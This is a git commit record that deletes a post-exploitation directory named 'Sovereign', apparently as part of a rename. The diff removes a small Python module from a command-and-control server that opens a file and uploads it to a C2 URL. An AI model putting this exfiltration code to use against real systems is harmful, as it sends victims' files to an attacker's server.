3d6cca8cdfe61cef47d859ea5e3b75b884d4cf68
41ph4-01 <166868320+4lph4-01@users.noreply.github.com>
2025-01-26 18:53:34 +0000

    Delete Post_Exploitation/Sovereign directory
    Rename of directory.

--- Post_Exploitation/Sovereign/c2_server/modules/exfiltration.py
+++
@@ -1,8 +0,0 @@
-import os
-import requests
-
-def exfiltrate_data(file_path, c2_url):
-    with open(file_path, 'rb') as f:
-        files = {'file': f}
-        response = requests.post(c2_url, files=files)
-    return response.status_code
